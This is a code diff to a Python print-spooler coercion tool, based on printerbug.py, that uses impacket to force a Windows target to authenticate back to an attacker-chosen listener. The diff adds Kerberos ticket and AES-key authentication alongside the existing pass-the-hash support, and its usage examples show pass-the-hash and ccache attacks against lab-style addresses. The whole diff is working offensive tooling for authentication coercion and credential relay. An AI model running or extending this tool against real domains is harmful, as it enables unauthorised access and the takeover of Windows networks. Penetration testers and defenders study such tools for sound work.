@@ -7,28 +7,42 @@ Based on https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 
 import argparse
 import logging
+import os
 import sys
 
 from impacket.dcerpc.v5 import epm, transport, rprn
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_CONNECT
+from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
 from impacket.dcerpc.v5.dtypes import NULL
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
+class _SupressFilter(logging.Filter):
+    def __init__(self, *fragments):
+        self._fragments = fragments
+    def filter(self, record):
+        return not any(f in record.getMessage() for f in self._fragments)
+
+logging.getLogger('impacket').addFilter(_SupressFilter('CCache file is not found'))
+
 
 class RpcTcpPrinterTrigger:
     def __init__(self, target_host, username='', password='', domain='',
-                 lmhash='', nthash='', listener=None, tcp_port=None):
+                 lmhash='', nthash='', aes_key='', listener=None, tcp_port=None,
+                 use_kerberos=False, dc_ip=None):
         self.target_host = target_host
         self.username = username
         self.password = password
         self.domain = domain
         self.lmhash = lmhash
         self.nthash = nthash
+        self.aes_key = aes_key
         self.listener = listener if listener else target_host
         self.tcp_port = tcp_port
-        
+        self.use_kerberos = use_kerberos
+        self.dc_ip = dc_ip
+
     def trigger_rpc_backconnect(self):
         try:
             if self.tcp_port:
@@ -53,17 +67,26 @@ class RpcTcpPrinterTrigger:
             logging.info(f'Connecting to {stringbinding}')
             rpctransport = transport.DCERPCTransportFactory(stringbinding)
 
-            if self.username:
+            if self.use_kerberos:
+                rpctransport.set_credentials(self.username, self.password, self.domain,
+                                             aesKey=self.aes_key)
+                rpctransport.set_kerberos(True, self.dc_ip)
+                krb_desc = 'AES key' if self.aes_key else 'ccache'
+                logging.info(f'Using Kerberos auth: {self.domain}\\{self.username} ({krb_desc}, KDC: {self.dc_ip or "auto"})')
+            elif self.username:
                 rpctransport.set_credentials(self.username, self.password, self.domain,
                                              lmhash=self.lmhash, nthash=self.nthash)
-                auth_desc = f'(hash)' if self.nthash else f'(password)'
+                auth_desc = '(hash)' if self.nthash else '(password)'
                 logging.info(f'Using credentials: {self.domain}\\{self.username} {auth_desc}')
             else:
                 logging.info('Using anonymous/null session')
 
             dce = rpctransport.get_dce_rpc()
 
-            if self.username:
+            if self.use_kerberos:
+                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+                dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
+            elif self.username:
                 dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
                 #dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
             
@@ -153,6 +176,9 @@ examples:
   # pass-the-hash (NT hash only)
   %(prog)s -t 10.10.11.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d CORP -l 10.10.14.5
 
+  # Kerberos with ccache (use FQDN as target for SPN; KRB5CCNAME can also be set in the environment)
+  %(prog)s -t wmc-ca.corp.local -u 'svc$' -d CORP -k --ccache svc.ccache --dc-ip 10.10.11.1 -l 10.10.14.5
+
   # specific RPC port (skip EPM lookup)
   %(prog)s -t 10.10.11.50 -u svc -H aad3b435b51404eeaad3b435b51404ee -d CORP -l 10.10.14.5 --port 49152
 """
@@ -165,7 +191,7 @@ def main():
         epilog=EXAMPLES,
     )
     parser.add_argument('-t', '--target', required=True,
-                        help='target IP or hostname')
+                        help='target hostname or IP (use FQDN with -k for Kerberos SPN resolution)')
     parser.add_argument('-u', '--username', default='',
                         help='username')
     parser.add_argument('-p', '--password', default='',
@@ -178,7 +204,22 @@ def main():
                         help='listener IP/host for backconnect (default: TARGET)')
     parser.add_argument('--port', type=int, default=None,
                         help='specific spoolss RPC/TCP port (omit to query EPM)')
+    parser.add_argument('-k', '--kerberos', action='store_true',
+                        help='use Kerberos authentication (ccache via KRB5CCNAME or --ccache)')
+    parser.add_argument('--ccache', default=None,
+                        help='path to ccache file (sets KRB5CCNAME, implies -k)')
+    parser.add_argument('--aes-key', metavar='HEXKEY', default=None,
+                        help='AES128/256 key for Kerberos auth (implies -k)')
+    parser.add_argument('--dc-ip', default=None,
+                        help='IP of the domain controller / KDC')
     args = parser.parse_args()
+
+    # --ccache and --aes-key both imply Kerberos
+    use_kerberos = args.kerberos or bool(args.ccache) or bool(args.aes_key)
+
+    if args.ccache:
+        os.environ['KRB5CCNAME'] = args.ccache
+        logging.info(f'KRB5CCNAME set to: {args.ccache}')
 
     nthash = args.hashes or ''
     lmhash = ''
@@ -189,7 +230,17 @@ def main():
     listener = args.listener or args.target
     print(f"Target:    {args.target}")
     print(f"Listener:  {listener}")
-    if args.username:
+    if use_kerberos:
+        auth = f"{args.domain}\\{args.username}" if args.domain else args.username
+        if args.aes_key:
+            krb_method = f'AES key ({args.aes_key[:8]}...)'
+        elif args.ccache:
+            krb_method = f'ccache ({args.ccache})'
+        else:
+            krb_method = 'ccache (KRB5CCNAME)'
+        print(f"Auth:      {auth or '(from ccache)'} (Kerberos / {krb_method})")
+        print(f"KDC:       {args.dc_ip or 'auto'}")
+    elif args.username:
         auth = f"{args.domain}\\{args.username}" if args.domain else args.username
         auth += " (hash)" if nthash else " (password)"
         print(f"Auth:      {auth}")
@@ -208,6 +259,9 @@ def main():
         nthash=nthash,
         listener=args.listener,
         tcp_port=args.port,
+        use_kerberos=use_kerberos,
+        aes_key=args.aes_key or '',
+        dc_ip=args.dc_ip,
     )
 
     success = trigger.trigger_rpc_backconnect()
